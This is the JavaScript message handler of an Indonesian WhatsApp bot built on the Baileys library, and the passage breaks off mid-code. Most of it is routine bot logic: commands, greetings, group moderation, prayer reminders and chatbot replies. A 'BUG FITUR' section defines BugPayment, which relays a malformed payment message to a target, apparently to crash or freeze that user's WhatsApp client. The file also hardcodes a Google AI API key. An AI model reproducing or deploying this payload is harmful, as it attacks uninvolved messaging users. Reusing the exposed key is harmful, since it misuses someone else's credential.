/**
BASE ORI SIPUTZ
RECODE BASE TANAKA SENSE
**/

require('./lib/listmenu')
require('./settings')
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@adiwajshing/baileys')
const { exec, spawn, execSync } = require("child_process")
const fs = require('fs')
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const path = require('path')
const axios = require('axios')
const chalk = require('chalk')
const FormData = require('form-data');
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const { performance } = require("perf_hooks");
const { TelegraPH } = require("./lib/TelegraPH")
const uploadImage = require('./lib/uploadImage');
const { remini, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const { spotifydll, searchSpotifyTrack } = require('./lib/spotifyy')
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const ms = toMs = require('ms')
const gis = require('g-i-s')
const yts = require("yt-search")
const canvafy = require('canvafy')
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const timestampp = speed();
const latensi = speed() - timestampp
const { ytdl } = require('./lib/ytdl')
const { bytesToSize, checkBandwidth, formatSize, jsonformat, nganuin, shorturl, color } = require("./lib/myfunction");
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const _sewa = require("./lib/sewa");
const { xnxxDownloader, xnxxSearch } = require('./lib/xnxx')
const { addExif } = require('./lib/exif')
const {
    smsg,
    formatDate,
    getTime,
    getGroupAdmins,
    formatp,
    await,
    sleep,
    runtime,   
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./lib/myfunc')
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//Database
const mut = JSON.parse(fs.readFileSync("./system/database/mute.json"));
let premium = JSON.parse(fs.readFileSync('./system/database/premium.json'));
const chatband = JSON.parse(fs.readFileSync("./system/database/banchat.json"));
const simion = JSON.parse(fs.readFileSync('./database/simion.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntstone =JSON.parse(fs.readFileSync('./database/antibatu.json'));
let ntsticker =JSON.parse(fs.readFileSync('./database/antisticker.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));

module.exports = lilychan = async (lilychan, m, chatUpdate, store) => {
try {
const body = (m && m.mtype) ? (
m.mtype === 'conversation' ? m.message?.conversation :
m.mtype === 'imageMessage' ? m.message?.imageMessage?.caption :
m.mtype === 'videoMessage' ? m.message?.videoMessage?.caption :
m.mtype === 'extendedTextMessage' ? m.message?.extendedTextMessage?.text :
m.mtype === 'buttonsResponseMessage' ? m.message?.buttonsResponseMessage?.selectedButtonId :
m.mtype === 'listResponseMessage' ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m.mtype === 'templateButtonReplyMessage' ? m.message?.templateButtonReplyMessage?.selectedId :
m.mtype === 'messageContextInfo' ? (
m.message?.buttonsResponseMessage?.selectedButtonId || 
m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || 
m.text
) : ''
) : '';
const budy = (m && typeof m.text === 'string') ? m.text : '';
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '🐹'
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m.pushName || "No Name";
const botNumber = await lilychan.decodeJid(lilychan.user.id);
const type = m
const sender = m.sender
const isSewa = _sewa.checkSewaGroup(from, sewa)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const itsMe = (m && m.sender && m.sender == botNumber) || false;
const text = q = args.join(" ");
const fatkuns = m && (m.quoted || m);
const quoted = (fatkuns?.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
(fatkuns?.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
(fatkuns?.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] :
m.quoted || m;
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const qmsg = (quoted?.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const mute = m.isGroup ? mut.includes(from) : false
const banchat = m.isGroup ? chatband.includes(from) : false
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
//group
const groupMetadata = m.isGroup ? await lilychan.groupMetadata(m.chat).catch(e => {}) : {};
const groupName = m.isGroup ? groupMetadata.subject || '' : '';
const participants = m.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isBot = botNumber.includes(senderNumber)
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(lilychan, m, premium);
const groupOwner = m.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false;
const SimiActive = m.isGroup ? simion.includes(from) : false
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const isMediaLily = m.mtype
//dibawah ini ada beberapa fungsi 
const antilinkngawi = m.isGroup ? ntlinkgc.includes(m.chat) : false
const Antibatu = m.isGroup ? ntstone.includes(m.chat) : false
const Antisticker = m.isGroup ? ntsticker.includes(m.chat) : false
//================== [ TIME ] ==================//
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const salam = 'Selamat '+dt.charAt(0).toUpperCase() + dt.slice(1)    
let dot = new Date(new Date + 3600000)
const dateIslamic = Intl.DateTimeFormat("id" + '-TN-u-ca-islamic', {day: 'numeric',month: 'long',year: 'numeric'}).format(dot)
const lilydate = moment.tz('Asia/Jakarta').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
        
         if(time2 < "23:59:00"){
         var emojiwaktu = `🌌`
         }
         if(time2 < "19:00:00"){
         var emojiwaktu = `🌙`
         }
         if(time2 < "18:00:00"){
         var emojiwaktu = `🌅`
         }
         if(time2 < "17:00:00"){
         var emojiwaktu = `🌅`
         }
         if(time2 < "15:00:00"){
         var emojiwaktu = `☀️`
         }
         if(time2 < "11:00:00"){
         var emojiwaktu = `🌄`
         }
         if(time2 < "05:00:00"){
         var emojiwaktu = `🌙`
        } 
//================== [ FUNCTION ] ==================//

const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};


async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

const totalFitur = () => {
    var mytext = fs.readFileSync("./message.js").toString();
    var numUpper = (mytext.match(/case '/g) || []).length;
    return numUpper;
};

const pickRandom = (arr) => {
    return arr[Math.floor(Math.random() * arr.length)];
};

if (prefix && command) {
    let caseNames = getCaseNames();

    function getCaseNames() {
        const fs = require('fs');
        try {
            const data = fs.readFileSync('message.js', 'utf8');
            const casePattern = /case\s+'([^']+)'/g;
            const matches = data.match(casePattern);
            if (matches) {
                return matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
            } else {
                return [];
            }
        } catch (err) {
            console.log('Terjadi kesalahan:', err);
            return [];
        }
    }

    let noPrefix = command;
    let mean = didyoumean(noPrefix, caseNames);
    let sim = similarity(noPrefix, mean);
    let similarityPercentage = parseInt(sim * 100);

    if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
        let response = `Sorry, the command you gave is wrong. Maybe this is what you mean :\n\n> Command : ${prefix + mean}\n> Similarities : ${similarityPercentage}%`;
        m.reply(response);
    }
}

async function uploadToUguu(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            throw new Error("File not found");
        }

        const formData = new FormData();
        formData.append('files[]', fs.createReadStream(filePath));

        const response = await axios.post('https://uguu.se/upload', formData, {
            headers: {
                ...formData.getHeaders(),
            },
            params: {
                output: 'json', // Meminta respons dalam format JSON
            },
        });

        if (response.status === 200 && response.data && response.data.files && response.data.files[0]) {
            return response.data.files[0].url; // Mengembalikan URL file yang diunggah
        } else {
            throw new Error(`Upload failed with status: ${response.status}`);
        }
    } catch (err) {
        throw new Error(`Upload failed: ${err.message}`);
    }
}

// Respon Cmd with media
if (isMediaLily && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
    let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')];
    let { text, mentionedJid } = hash;
    let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
        userJid: lilychan.user.id,
        quoted: m.quoted && m.quoted.fakeObj
    });
    
    messages.key.fromMe = areJidsSameUser (m.sender, lilychan.user.id);
    messages.key.id = m.key.id;
    messages.pushName = m.pushName;

    if (m.isGroup) messages.participant = m.sender;

    let msg = {
        ...chatUpdate,
        messages: [proto.WebMessageInfo.fromObject(messages)],
        type: 'append'
    };
    lilychan.ev.emit('messages.upsert', msg);
}
 
// AMBIL PP USER
try {
    var ppuser = await lilychan.profilePictureUrl(m.sender, 'image');
} catch (err) {
    var ppuser = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg';
}

let ppnyauser = await getBuffer(ppuser);

const reSize = async (buffer, ukur1, ukur2) => {
    return new Promise(async (resolve, reject) => {
        let jimp = require('jimp');
        var baper = await jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG);
        resolve(ab);
    });
};

const fkethmb = await reSize(ppuser, 300, 300); // Mengubah ukuran gambar

// Function resize
let jimp = require("jimp");

const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let ppUrl = await lilychan.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');

lilychan.autoshalat = lilychan.autoshalat ? lilychan.autoshalat : {};
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? lilychan.user.id : m.sender;
let id = m.chat;

if (id in lilychan.autoshalat) {
    return false;
}

let jadwalSholat = {
    shubuh: "04:29",
    terbit: "05:44",
    dhuha: "06:16",
    dzuhur: "12:02",
    ashar: "15:15",
    magrib: "17:52",
    isya: "19:01",
};

const datek = new Date(
    new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta",
    })
);
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;

for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        lilychan.autoshalat[id] = [
            lilychan.sendMessage(m.chat, {
                audio: {
                    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
                },
                mimetype: 'audio/mp4',
                ptt: true,
                contextInfo: {
                    mentions: participants.map(a => a.id),
                    externalAdReply: {
                        showAdAttribution: true,
                        mediaType: 1,
                        mediaUrl: '',
                        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
                        body: `🕑 ${waktu}`,
                        sourceUrl: '',
                        thumbnailUrl: `https://i.top4top.io/p_3193v20ky1.jpg`,
                        renderLargerThumbnail: true
                    }
                }
            }, {
                quoted: m,
            }),
            setTimeout(async () => {
                delete lilychan.autoshalat[m.chat];
            }, 57000),
        ];
    }
}
//================== [ DATABASE ] ==================//








//================== [ CONSOL LOGG] ==================//

if (m.message) {            
    console.log(chalk.cyan(`────────────『 ${chalk.redBright('ᴵᴺᶠᴼ ᴹᴱˢˢᴬᴳᴱ')} 』────────────`));
    console.log(`   ${chalk.cyan('» Message Type')}: ${m.mtype}`);
    console.log(`   ${chalk.cyan('» Sent Time')}: ${time2}`);
    console.log(`   ${chalk.cyan('» Sender Name')}: ${pushname || 'N/A'}`);
    console.log(`   ${chalk.cyan('» Chat ID')}: ${m.chat.split('@')[0]}`);
    console.log(`   ${chalk.cyan('» Chat Name')}: ${budy || 'N/A'}`);
    console.log(`   ${chalk.cyan('» Author By')}: TanakaSensei`);
    console.log(chalk.cyan('───────────────────────────────────⳹\n'));
}

//================== [ FAKE REPLY ] ==================//
const fkontak = {
    key: {
        participants: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "Halo"
    },
    message: {
        contactMessage: {
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        }
    },
    participant: "0@s.whatsapp.net"
};

const ftroli = {
    key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
    },
    message: {
        orderMessage: {
            itemCount: 2024,
            status: 200,
            thumbnail: fkethmb, // Gambar thumbnail
            surface: 200,
            message: '𝕷𝖎𝖑𝖞𝖈𝖍𝖆𝖓𝖏 - 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕',
            orderTitle: '@sensei',
            sellerJid: '0@s.whatsapp.net'
        }
    },
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true
    },
    sendEphemeral: true
};

const qchanel = {
    key: {
        remoteJid: 'status@broadcast',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        newsletterAdminInviteMessage: {
            newsletterJid: `120363285176234746@newsletter`,
            newsletterName: `Hore`,
            jpegThumbnail: "",
            caption: '𝙻𝚒𝚕𝚢𝚌𝚑𝚊𝚗𝚓 × 𝚂𝚎𝚗𝚜𝚎𝚒',
            inviteExpiration: Date.now() + 1814400000
        }
    }
};

const replyURL = async (teks) => {
    lilychan.sendMessage(m.chat, {
        document: fs.readFileSync("./package.json"),
        fileName: '❃ Lilychanj - WhatsApp Bot',
        fileLength: 1,
        mimetype: 'application/pdf',
        jpegThumbnail: fs.readFileSync('./AllMedia/image/thumb.jpg'),
        caption: "\n" + Styles(teks),
        contextInfo: {
            showAdAttribution: true,
            forwardingScore: 10,
            isForwarded: true,
            mentionedJid: [m.sender],
            businessMessageForwardInfo: {
                businessOwnerJid: `6281541177589@s.whatsapp.net`
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363285176234746@newsletter',
                serverMessageId: null,
                newsletterName: '- Tanaka Sense • Chanels -'
            }
        }
    }, { quoted: qchanel, ephemeralExpiration: 86400 });
};

const reply = async (teks) => {
    lilychan.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363285176234746@newsletter',
                serverMessageId: 20,
                newsletterName: '❃ Lilychanj - Assistant'
            },
            externalAdReply: {
                title: "Lilychanj - Wabot",
                body: "",
                thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg",
                sourceUrl: null,
                mediaType: 1
            }
        }
    }, { quoted: m });
};

const pdfreply = async (teks) => {
    lilychan.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentions: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `Lilychanj - Wabot`,
                body: '',
                thumbnailUrl: "https://h.top4top.io/p_31922c8vs1.jpg",
                sourceUrl: "https://Instagram.com/senzhndra",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
};

const lilychanjReply = async (teks) => {
    lilychan.sendMessage(m.chat, {
        text: Styles(teks),
        mentions: [m.sender]
    }, { quoted: m });
};

//================== [ BUG FITUR ] ==================//

async function BugPayment(jid){
await lilychan.relayMessage(jid, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {}}, interactiveMessage: {
nativeFlowMessage: {
buttons: [
{
name: 'payment_info',
buttonParamsJson: '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
},
],
}}}}}, { participant: { jid: jid } }, { messageId: null })}

//================== [ BOT FITUR ] ==================//
// FUNCTION AI
if (SimiActive) {
    const languageCode = 'id';
    const simsimiKey = ''; 
    fetch('https://api.simsimi.vn/v1/simtalk', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `text=hm ${encodeURIComponent(text)}&lc=${languageCode}&key=${simsimiKey}`
    })
    .then(response => response.json())
    .then(data => {
        const simsimiResponse = data.message;
        const replyText = `${simsimiResponse}`;
        lilychan.sendMessage(m.chat, { text: replyText }, { quoted: m });
    })
    .catch(error => {
        console.error('Error:', error);
        m.reply('Terjadi kesalahan saat mencoba berkomunikasi dengan SimSimi.');
    });
} 


if (!m.isGroup && !m.key.fromMe && !isImage && !isSticker && !isCmd) {
    async function openai(text, logic) {
        // Membuat fungsi openai untuk dipanggil
        let response = await axios.post("https://chateverywhere.app/api/chat/", {
            "model": {
                "id": "gpt-4",
                "name": "GPT-4",
                "maxLength": 32000, // Sesuaikan token limit jika diperlukan
                "tokenLimit": 8000, // Sesuaikan token limit untuk model GPT-4
                "completionTokenLimit": 5000, // Sesuaikan jika diperlukan
                "deploymentName": "gpt-4"
            },
            "messages": [
                {
                    "pluginId": null,
                    "content": text,
                    "role": "user"
                }
            ],
            "prompt": logic,
            "temperature": 0.5
        }, {
            headers: {
                "Accept": "/*/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            }
        });

        let result = response.data;
        return result;
    }

    try {
        if (text && m.quoted && 
            (m.quoted.mimetype === "image/jpeg" || m.quoted.mimetype === "image/png")) {
            
            let lilywabot = args[0];
            let lilychanj = text;
            const { GoogleGenerativeAI, HarmBlockThreshold, HarmCategory } = require("@google/generative-ai");
            const { GoogleAIFileManager } = require("@google/generative-ai/server");

            const Used_Apikey = "AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ";
            const genAI = new GoogleGenerativeAI(Used_Apikey);
            const fileManager = new GoogleAIFileManager(Used_Apikey);
            const prompt = lilychanj;
            const modepl = genAI.getGenerativeModel({
                model: "gemini-1.5-pro",
            });

            const fileBuffer = m.quoted ? await m.quoted.download() : await m.download();
            const tempFilePath = path.join(__dirname, `temp_image_${Date.now()}.jpg`);
            fs.writeFileSync(tempFilePath, fileBuffer);

            if (/image/.test(mime)) {
                const uploadResponse = await fileManager.uploadFile(tempFilePath, {
                    mimeType: "image/jpeg",
                    displayName: `temp_image_${Date.now()}`,
                });
                
                // Hapus file sementara setelah diupload
                fs.unlinkSync(tempFilePath);
                console.log(`Uploaded file ${uploadResponse.file.displayName} as: ${uploadResponse.file.uri}`);

                const result = await modepl.generateContent([
                    {
                        fileData: {
                            mimeType: uploadResponse.file.mimeType,
                            fileUri: uploadResponse.file.uri
                        }
                    },
                    { text: 'gunakan bahasa indonesia ' + prompt },
                ]);
                m.reply(result.response.text());
            } else {
                m.reply(`Reply to the image`);
            }
        } else if (text) {
            let tanakasange = await openai(text, `Namamu adalah Lily, seorang ilmuwan jenius yang berada di bimbingan Tanaka Sensei. Kamu mempunyai kucing yang sangat imut bernama Mimi. Kamu harus memanggil lawan bicaramu dengan nama mereka "${pushname}". Kamu harus menjawab semua pertanyaan dengan nada gemetar serta canggung seperti Yor dan sertakan kaomoji gugup.`);
            m.reply(tanakasange);
        }
    } catch (e) {
        m.reply(e.message);
    }
}
        

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum"].includes(budy)) {
    let urel = `https://pomf2.lain.la/f/7ixvc40h.mp3`;
    lilychan.sendMessage(m.chat, { audio: { url: urel }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}

if ((budy.match) && ["kak", "woy", "mek", "jawir", "y", "dah", "yaudah", "bang", "bg", "Bang", "Bg", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
    var stik = await fetchJson('https://raw.githubusercontent.com/TanakaDomp/Database-Json/refs/heads/main/StickerRespon.json');
    var pick = pickRandom(stik);
    lilychan.sendImageAsSticker(m.chat, pick.url, m, { packname: global.packname, author: global.author });
}

if ((budy.match) && ["p", "P", "bot", "Bot"].includes(budy)) {
    const kta = ['Haii💬', 'Ada yg bisa saya bantu (⁠◕⁠ᴗ⁠◕⁠✿⁠)', 'Halo!🌸', 'Ya, ada apa kak?✨'];
    const su = kta[Math.floor(Math.random() * kta.length)];
    m.reply(su);
}

  /*  if(isMediaLily === "audioMessage"){
          lilychan.sendMessage(m.chat, {
               audio: await quoted.download(),
               mimetype: 'audio/mpeg',
               ptt: true
                }, {
                quoted: m
            })
          }*/

if (antilinkngawi) {
    if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply('_Lily Harus Menjadi Admin Terlebih Dahulu_');
        
        let gclink = (`https://chat.whatsapp.com/` + await lilychan.groupInviteCode(m.chat));
        let isLinkThisGc = new RegExp(gclink);
        let isgclink = isLinkThisGc.test(m.text);

        if (isgclink) {
            return lilychan.sendMessage(m.chat, {
                text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAnda tidak akan di kick oleh lily karena yang Anda kirim adalah tautan ke grup ini`
            });
        }

        if (isAdmins) return m.reply("hai admin");
        if (isCreator) return m.reply("hai owner");

        await lilychan.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });

        lilychan.sendMessage(m.chat, {
            text: `\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m });
    }
}

if (Antibatu) {
    if (budy.match(`🗿`)) {
        if (!isBotAdmins) return m.reply('_Lily Harus Menjadi Admin Terlebih Dahulu_');        
        if (isAdmins) return;   
        if (isCreator) return;   

        await lilychan.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });

        lilychan.sendMessage(m.chat, {
            text: `\`\`\`「 Detected Stone 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan sebuah emoji batu dan berhasil dihapus`,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m });
    }
}

if (Antisticker) {
    if (isMediaLily === "stickerMessage") {
        if (!isBotAdmins) return m.reply('_Lily Harus Menjadi Admin Terlebih Dahulu_');        
        if (isAdmins) return;   
        if (isCreator) return;   

        await lilychan.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });

        lilychan.sendMessage(m.chat, {
            text: `\`\`\`「 Sticker Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan sebuah sticker dan berhasil dihapus`,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m });
    }
}
   
if (!lilychan.public) {
    if (!isCreator && !m.key.fromMe) return;
}

if (autoread) {
    lilychan.readMessages([m.key]);
}

if (global.autoTyping) {
    lilychan.sendPresenceUpdate('composing', from);
}

if (global.autoRecording) {
    lilychan.sendPresenceUpdate('recording', from);
}

lilychan.sendPresenceUpdate('uavailable', from);

if (global.autorecordtype) {
    let anyarecordin = ['recording', 'composing'];
    let anyarecordinfinal = anyarecordin[Math.floor(Math.random() * anyarecordin.length)];
    lilychan.sendPresenceUpdate(anyarecordinfinal, from);
}

if (autobio) {
    lilychan.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _);
}

if (mute) {
    if (!isBot && !isCreator && !isAdmins) return;
}

if (banchat) {
    if (!isBot && !isCreator) return;
}
              
//================== [ PLUGINS ] ==================//
  /*!-======[ Plugins Imports ]======-!*/
const loadPlugins = (directory) => {
    let plugins = []
    const folders = fs.readdirSync(directory)
    folders.forEach(folder => {
        const folderPath = path.join(directory, folder)
        if (fs.lstatSync(folderPath).isDirectory()) {
            const files = fs.readdirSync(folderPath)
            files.forEach(file => {
                const filePath = path.join(folderPath, file)
                if (filePath.endsWith(".js")) {
                    try {
                        delete require.cache[require.resolve(filePath)]
                        const plugin = require(filePath)
                        plugin.filePath = filePath
                        plugins.push(plugin)
                    } catch (error) {
                        console.error(`Error loading plugin at ${filePath}:`, error)
                    }
                }
            })
        }
    })
    return plugins
}
// Ngambil semua plugin dari direktori plugin
const plugins = loadPlugins(path.resolve(__dirname, "./Plugins"))
const context = { 
    lilychan, 
    replyURL,
    m, 
    chatUpdate, 
    store, 
    body,   
    prefix,
    command,
    q,
    text,
    quoted,
    require,
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
